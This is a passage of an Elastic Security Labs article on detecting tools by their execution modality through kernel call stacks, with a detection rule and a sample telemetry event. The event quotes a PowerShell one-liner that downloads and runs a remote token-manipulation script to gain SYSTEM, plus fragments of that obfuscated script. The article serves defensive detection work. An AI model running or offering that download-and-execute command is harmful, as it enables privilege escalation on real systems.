    },
    &quot;behaviors&quot;: [
     &quot;sensitive_api&quot;,
     &quot;hollow_image&quot;,
     &quot;unbacked_rwx&quot;
    ],
    &quot;name&quot;: &quot;VirtualProtect&quot;,
    &quot;parameters&quot;: {
     &quot;address&quot;: 140727652261072,
     &quot;size&quot;: 33,
     &quot;protection_old&quot;: &quot;R-X&quot;,
     &quot;protection&quot;: &quot;RWX&quot;
    }
   },
   &quot;code_signature&quot;: [
    {
     &quot;trusted&quot;: true,
     &quot;subject_name&quot;: &quot;Microsoft Windows&quot;,
     &quot;exists&quot;: true,
     &quot;status&quot;: &quot;trusted&quot;
    }
   ],
   &quot;token&quot;: {
    &quot;integrity_level_name&quot;: &quot;high&quot;
   }
  },
  &quot;thread&quot;: {
   &quot;Ext&quot;: {
    &quot;call_stack_summary&quot;: &quot;ntdll.dll|kernelbase.dll|Unbacked&quot;,
    &quot;call_stack_contains_unbacked&quot;: true,
    &quot;call_stack&quot;: [
     {
      &quot;symbol_info&quot;: &quot;c:\\windows\\system32\\ntdll.dll!NtProtectVirtualMemory+0x14&quot;
     },
     {
      &quot;symbol_info&quot;: &quot;c:\\windows\\system32\\kernelbase.dll!VirtualProtect+0x3b&quot;
     },
     {
      &quot;symbol_info&quot;: &quot;Unbacked+0x3b5c&quot;,
      &quot;protection_provenance&quot;: &quot;clr.dll&quot;,
      &quot;callsite_trailing_bytes&quot;: &quot;41c644240c01833dab99f35f007406ff15b7b6f25f8bf0e85883755f85f60f95c00fb6c00fb6c041c644240c01488b55884989542410488d65c85b5e5f415c41&quot;,
      &quot;protection&quot;: &quot;RWX&quot;,
      &quot;callsite_leading_bytes&quot;: &quot;df765f4d63f64c897dc0488d55b8488bcee8ee6da95f4d8bcf488bcf488bd34d8bc64533db4c8b55b84c8955904c8d150c0000004c8955a841c644240c00ffd0&quot;
     }
    ],
    &quot;call_stack_final_user_module&quot;: {
     &quot;code_signature&quot;: [
      {
       &quot;trusted&quot;: true,
       &quot;subject_name&quot;: &quot;Microsoft Corporation&quot;,
       &quot;exists&quot;: true,
       &quot;status&quot;: &quot;trusted&quot;
      }
     ],
     &quot;protection_provenance_path&quot;: &quot;c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\clr.dll&quot;,
     &quot;name&quot;: &quot;Unbacked&quot;,
     &quot;protection_provenance&quot;: &quot;clr.dll&quot;,
     &quot;protection&quot;: &quot;RWX&quot;,
     &quot;hash&quot;: {
      &quot;sha256&quot;: &quot;707564fc98c58247d088183731c2e5a0f51923c6d9a94646b0f2158eb5704df4&quot;
     }
    }
   },
   &quot;id&quot;: 17260
  }
 },
 &quot;user&quot;: {
  &quot;id&quot;: &quot;S-1-5-21-47396387-2833971351-1621354421-500&quot;
 }
}</code></pre>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="robustness-assessment" class="absolute -top-32"></span><strong>Robustness assessment</strong></h2>
<p>Using the <a href="https://ctid.mitre.org/projects/summiting-the-pyramid/">Summiting the Pyramid</a> analytic scoring methodology we can compare our PowerShell modality-based detection rule with traditional PowerShell</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left"></th><th align="left">Application (A)</th><th align="left">User mode (U)</th><th align="left">Kernel mode (K)</th></tr></thead><tbody><tr><td align="left"><strong>Core to (Sub) Technique (5)</strong></td><td align="left"></td><td align="left"></td><td align="left"><strong>[ best ]</strong> Kernel ETW-based PowerShell modality detections</td></tr><tr><td align="left"><strong>Core to Part of (Sub-) Technique (4)</strong></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><strong>Core to Pre-Existing Tool (3)</strong></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><strong>Core to Adversary-brought Tool (2)</strong></td><td align="left">AMSI and ScriptBlock-based PowerShell content detections</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><strong>Ephemeral (1)</strong></td><td align="left"><strong>[ worst ]</strong></td><td align="left"></td><td align="left"></td></tr></tbody></table></div>
<p>PowerShell Analytic Scoring using <a href="https://ctid.mitre.org/projects/summiting-the-pyramid/">Summiting the Pyramid</a></p>
<p>As noted earlier, most PowerShell detections receive a low 2A robustness score using the STP scale.  This is in stark contrast to our <a href="https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/windows/execution_suspicious_api_call_from_a_powershell_script.toml">PowerShell misbehaving modality rule</a> which receives the highest possible 5K score (where appropriate kernel telemetry is available from Microsoft).</p>
<p>One caveat is that an STP analytic score does not yet include any measure for the setup and maintenance costs of a rule. This could potentially be approximated by the size of the known false positive software list for a given rule - though most open rule sets typically do not include this information. We do and, in our rule’s case, the false positives observed to date have been extremely manageable.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="can-call-stacks-be-spoofed-though" class="absolute -top-32"></span><strong>Can call stacks be spoofed though?</strong></h2>
<p>Yes - and slightly no. Our call stacks are all collected inline in the kernel, but the user-mode call stack itself resides in user-mode memory that the malware may control. This means that, if malware has achieved arbitrary execution, then it can control the stack frames that we see.</p>
<p>Sure, dual-purpose API <a href="https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+%22Unbacked+memory%22&amp;type=code">calls from private memory</a> are suspicious, but sometimes trying to hide your private memory is even more suspicious. This can take the form of:</p>
<ul>
<li>Calls from <a href="https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+allocation_private_bytes&amp;type=code">overwritten modules</a>.</li>
<li>Return addresses <a href="https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+image_rop&amp;type=code">without a preceding call</a> instruction.</li>
<li>Calls <a href="https://github.com/search?q=repo%3Aelastic%2Fprotections-artifacts+proxy_call&amp;type=code">proxied via other modules</a>.</li>
</ul>
<p>Call stack control alone may not be enough. In order to truly bypass some of our call stack detections, an attacker must craft a call stack that entirely blends with normal activity.  In some environments this can be baselined by security teams with high accuracy; making it hard for the attackers to remain undetected. Based on our in-house research, and with the assistance of red team tool developers, we are also continually improving our out-of-the-box detections.</p>
<p>Finally, on modern CPUs there are also numerous execution trace mechanisms that can be used to detect stack spoofing - such as <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Pierce-Capturing-0days-With-PERFectly-Placed-Hardware-Traps-wp.pdf">Intel LBR</a>, Intel BTS, Intel AET, <a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2017/01/griffin-asplos17.pdf">Intel IPT</a>, <a href="https://www.elastic.co/security-labs/finding-truth-in-the-shadows">x64 CET</a> and <a href="https://lwn.net/Articles/824613/">x64 Architectural LBR</a>. Elastic already takes advantage of some of these hardware features, we have suggested to Microsoft that they may also wish to do so in further scenarios outside of exploit protection, and we are investigating further enhancements ourselves. Stay tuned.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="conclusion" class="absolute -top-32"></span><strong>Conclusion</strong></h2>
<p>Execution Modality is a new lens through which we can seek to understand attacker tradecraft.</p>
<p>Detecting specific techniques for individual modalities is not a cost-effective approach though - there are simply too many techniques and too many modalities. Instead, we should focus our technique detections as close to the operating system source of truth as possible; being careful not to lose necessary activity context, or to introduce unmanageable false positives. This is why Elastic considers <a href="https://www.elastic.co/security-labs/kernel-etw-best-etw">Kernel ETW</a> to be superior to user-mode <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ntdll</code> hooking - it is closer to the source of truth allowing more robust detections.</p>
<p>For modality-based detection approaches, the value becomes apparent when we baseline <strong>all</strong> expected low-level telemetry for a given modality - and trigger on <strong>any</strong> deviations.</p>
<p>Historically, attackers have been able to choose modality for convenience. It is more cost effective to write tools in C# or PowerShell than in C or assembly.  If we can herd modality then we’ve imposed cost.</p></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/misbehaving-modalities#what-is-execution-modality"><span>**What is Execution&nbsp;Modality?**</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/misbehaving-modalities#case-study-service-creation-modalities"><span>**Case Study: service creation&nbsp;modalities**</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/misbehaving-modalities#call-stacks-divulge-modality"><span>**Call stacks divulge&nbsp;Modality**</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/misbehaving-modalities#robustness-assessment"><span>**Robustness&nbsp;assessment**</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/misbehaving-modalities#can-call-stacks-be-spoofed-though"><span>**Can call stacks be spoofed&nbsp;though?**</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/misbehaving-modalities#conclusion"><span>**Conclusion**</span></a></li></ul></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/elastic-security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Misbehaving Modalities: Detecting Tools, Not Techniques&amp;url=https://www.elastic.co/security-labs/misbehaving-modalities" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/misbehaving-modalities" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/misbehaving-modalities&amp;title=Misbehaving Modalities: Detecting Tools, Not Techniques" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/misbehaving-modalities&amp;title=Misbehaving Modalities: Detecting Tools, Not Techniques" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2025<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Misbehaving Modalities: Detecting Tools, Not Techniques","slug":"misbehaving-modalities","date":"2025-05-15","description":"We explore the concept of Execution Modality and how modality-focused detections can complement behaviour-focused ones.","image":"modalities.png","body":{"raw":"\n## **What is Execution Modality?**\n\n[Jared Atkinson](https://medium.com/@jaredcatkinson), Chief Strategist at SpecterOps and prolific writer on security strategy, recently introduced the very useful concept of [Execution Modality](https://posts.specterops.io/behavior-vs-execution-modality-3318e8e81739) to help us reason about malware techniques, and how to robustly detect them. In short, Execution Modality describes *how* a malicious behaviour is executed, rather than simply defining *what* the behaviour does.\n\nFor example, the behaviour of interest might be [Windows service creation](https://attack.mitre.org/techniques/T1543/003/), and the modality might be either a system utility (such as \\`sc.exe\\`), a PowerShell script, or shellcode that uses indirect syscalls to directly write to the service configuration in the Windows Registry.  \n\nAtkinson outlined that if your goal is to detect a specific technique, you want to ensure that your collection is as close as possible to the operating system’s source of truth and eliminate any modality assumptions.\n\n## **Case Study: service creation modalities**\n\n![Service creation operation flow graph](/assets/images/misbehaving-modalities/flow.png)\n\nIn the typical Service creation scenario within the Windows OS, an installer calls [`sc.exe create`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) which makes an [`RCreateService`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/6a8ca926-9477-4dd4-b766-692fab07227e) RPC call to an endpoint in the [Service Control Manager](https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager) (SCM, aka `services.exe`) which then makes syscalls to the [kernel-mode configuration manager](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-configuration-manager) to update the [database of installed services](https://learn.microsoft.com/en-us/windows/win32/services/database-of-installed-services) in the registry.  This is later flushed to disk and restored from disk on boot.\n\nThis means that the source of truth for a running system [is the registry](https://abstractionmaps.com/maps/t1050/) (though hives are flushed to disk and can be tampered with offline).\n\nIn a threat hunting scenario, we could easily detect anomalous `sc.exe` command lines - but a different tool might make Service Control RPC calls directly.\n\nIf we were processing our threat data stringently, we could also detect anomalous Service Control RPC calls, but a different tool might make syscalls (in)directly or use another service, such as the [Remote Registry](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/ec095de8-b4fe-48fb-8114-dea65b4d710e), to update the service database indirectly.\n\nIn other words, some of these execution modalities bypass traditional telemetry such as [Windows event logs](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4697).\n\nSo how do we monitor changes to the configuration manager?  We can’t robustly monitor syscalls directly due to [Kernel Patch Protection](https://en.wikipedia.org/wiki/Kernel_Patch_Protection), but Microsoft has provided [configuration manager callbacks](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/filtering-registry-calls) as an alternative. This is where Elastic has [focused our service creation detection](https://github.com/tsale/EDR-Telemetry/pull/58#issuecomment-2043958734) efforts - as close to the operating system’s source of truth as possible.\n\nThe trade-off for this low-level visibility, however, is a potential reduction in context. For example, due to Windows architectural decisions, security vendors do not know which RPC client is requesting the creation of a registry key in the services database. Microsoft only supports querying RPC client details from a user-mode RPC service.  \n\nStarting with Windows 10 21H1, Microsoft began including [RPC client details in the service creation event log](https://github.com/jdu2600/Windows10EtwEvents/commit/5444e040d65ed2807fcf9ac69ce32131338dc370#diff-b88b65ff9fd39a51c51c594ee3787ea6907e780d4282ae9a7517c04074e2c2b7). This event, while less robust, sometimes provides additional context that might assist in determining the source of an anomalous behaviour.\n\nDue to their history of abuse, some modalities have been extended with extra logging - one important example is PowerShell.  This allows certain techniques to be detected with high precision - but *only* when executed within PowerShell. It is important not to conflate having detection coverage of a technique in PowerShell with coverage of that technique in general. This nuance is important when estimating [MITRE ATT\u0026CK](https://attack.mitre.org/) coverage.  As red teams routinely demonstrate, having 100% technique coverage - but only for PowerShell - is close to 0% real-world coverage.\n\n[Summiting the Pyramid](https://ctid.mitre.org/projects/summiting-the-pyramid/) (STP) is a related analytic scoring methodology from MITRE. It makes a similar conclusion about the fragility of [PowerShell scriptblock-based detections](https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/analytics/service_registry_permissions_weakness_check/) and assigns such rules a low robustness score.\n\nHigh-level telemetry sources, such as Process Creation logging and PowerShell logging, are extremely brittle at detecting most techniques as they cover very few modalities. At best, they assist in detecting the most egregious Living off the Land (LotL) abuses.\n\nAtkinson made the following astute observation in the [example](https://posts.specterops.io/behavior-vs-execution-modality-3318e8e81739) used to motivate the discussion:\n\n*An important point is that our higher-order objective in detection is behavior-based, not modality-based. Therefore, we should be interested in detecting Session Enumeration (behavior-focused), not Session Enumeration in PowerShell (modality-focused).*\n\nSometimes that is only half of the story though.  Sometimes detecting that the tool itself is out of context is more efficient than detecting the technique. Sometimes the execution modality itself is anomalous.\n\nAn alternative to detecting a known technique is to detect a misbehaving modality.\n\n## **Call stacks divulge Modality**\n\nOne of Elastic’s strengths is the inclusion of call stacks in the majority of our events. This level of call provenance detail greatly assists in determining whether a given activity is malicious or benign.  Call stack summaries are often sufficient to divulge the execution modality - the runtimes for PowerShell, .NET, RPC, WMI, VBA, Lua, Python, and Java all leave traces in the call stack.\n\nSome of our [first call stack-based rules](https://www.elastic.co/security-labs/upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks) were for Office VBA macros (`vbe7.dll`) spawning child processes or dropping files, and for unbacked executable memory loading the .NET runtime.  In both of these examples, the technique itself was largely benign; it was the modality of the behaviour that was predominantly anomalous.\n\nSo can we flip the typical behaviour-focused detection approach to a modality-focused one?  For example, can we detect solely on the use of **any** dual-purpose API call originating from PowerShell?\n\nUsing call stacks, Elastic is able to differentiate between the API calls that originate from PowerShell scripts and those that come from the PowerShell or .NET runtimes.\n\nUsing Threat-Intelligence ETW as an approximation for a dual-purpose API, our rule for “Suspicious API Call from a PowerShell Script” was quite effective.\n\n```sql\napi where\nevent.provider == \"Microsoft-Windows-Threat-Intelligence\" and\nprocess.name in~ (\"powershell.exe\", \"pwsh.exe\", \"powershell_ise.exe\") and\n\n/* PowerShell Script JIT - and incidental .NET assemblies */\nprocess.thread.Ext.call_stack_final_user_module.name == \"Unbacked\" and\nprocess.thread.Ext.call_stack_final_user_module.protection_provenance in (\"clr.dll\", \"mscorwks.dll\", \"coreclr.dll\") and\n\n/* filesystem enumeration activity */\nnot process.Ext.api.summary like \"IoCreateDevice( \\\\FileSystem\\\\*, (null) )\" and\n\n/* exclude nop operations */\nnot (process.Ext.api.name == \"VirtualProtect\" and process.Ext.api.parameters.protection == \"RWX\" and process.Ext.api.parameters.protection_old == \"RWX\") and\n\n/* Citrix GPO Scripts */\nnot (process.parent.executable : \"C:\\\\Windows\\\\System32\\\\gpscript.exe\" and\n  process.Ext.api.summary in (\"VirtualProtect( Unbacked, 0x10, RWX, RW- )\", \"WriteProcessMemory( Self, Unbacked, 0x10 )\", \"WriteProcessMemory( Self, Data, 0x10 )\")) and\n\n/* cybersecurity tools */\nnot (process.Ext.api.name == \"VirtualAlloc\" and process.parent.executable : (\"C:\\\\Program Files (x86)\\\\CyberCNSAgent\\\\cybercnsagent.exe\", \"C:\\\\Program Files\\\\Velociraptor\\\\Velociraptor.exe\")) and\n\n/* module listing */\nnot (process.Ext.api.name in (\"EnumProcessModules\", \"GetModuleInformation\", \"K32GetModuleBaseNameW\", \"K32GetModuleFileNameExW\") and\n  process.parent.executable : (\"*\\\\Lenovo\\\\*\\\\BGHelper.exe\", \"*\\\\Octopus\\\\*\\\\Calamari.exe\")) and\n\n/* WPM triggers multiple times at process creation */\nnot (process.Ext.api.name == \"WriteProcessMemory\" and\n     process.Ext.api.metadata.target_address_name in (\"PEB\", \"PEB32\", \"ProcessStartupInfo\", \"Data\") and\n     _arraysearch(process.thread.Ext.call_stack, $entry, $entry.symbol_info like (\"?:\\\\windows\\\\*\\\\kernelbase.dll!CreateProcess*\", \"Unknown\")))\n```\n\nEven though we don’t need to use the brittle PowerShell AMSI logging for detection, we can still provide this detail in the event as context as it assists with triage.  This modality-based approach even detects common PowerShell defence evasion tradecraft such as:\n - ntdll unhooking\n - AMSI patching\n - user-mode ETW patching\n\n```json\n{\n \"event\": {\n  \"provider\": \"Microsoft-Windows-Threat-Intelligence\",\n  \"created\": \"2025-01-29T18:27:09.4386902Z\",\n  \"kind\": \"event\",\n  \"category\": \"api\",\n  \"type\": \"change\",\n  \"outcome\": \"unknown\"\n },\n \"message\": \"Endpoint API event - VirtualProtect\",\n \"process\": {\n  \"parent\": {\n   \"executable\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"\n  },\n  \"name\": \"powershell.exe\",\n  \"executable\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\n  \"code_signature\": {\n   \"trusted\": true,\n   \"subject_name\": \"Microsoft Windows\",\n   \"exists\": true,\n   \"status\": \"trusted\"\n  },\n  \"command_line\": \"\\\"powershell.exe\\\" \u0026 {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}\",\n  \"pid\": 21908,\n  \"Ext\": {\n   \"api\": {\n    \"summary\": \"VirtualProtect( kernel32.dll!FatalExit, 0x21, RWX, R-X )\",\n    \"metadata\": {\n     \"target_address_path\": \"c:\\\\windows\\\\system32\\\\kernel32.dll\",\n     \"amsi_logs\": [\n      {\n       \"entries\": [\n        \"\u0026 {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}\",\n        \"{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}\",\n        \"function Get-WinLogonTokenSystem\\n{\\nfunction _10001011000101101\\n{\\n  [CmdletBinding()]\\n  Param(\\n [Parameter(Position = 0, Mandatory = $true)]\\n [ValidateNotNullOrEmpty()]\\n [Byte[]]\\n ${_00110111011010011},\\n ...\u003ctruncated\u003e\",\n        \"{[Char] $_}\",\n        \"{\\n [CmdletBinding()]\\n Param(\\n   [Parameter(Position = 0, Mandatory = $true)]\\n   [Byte[]]\\n   ${_00110111011010011},\\n   [Parameter(Position = 1, Mandatory = $true)]\\n   [String]\\n   ${_10100110010101100},\\n ...\u003ctruncated\u003e\",\n        \"{ $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }\"\n       ],\n       \"type\": \"PowerShell\"\n      }\n     ],\n     \"target_address_name\": 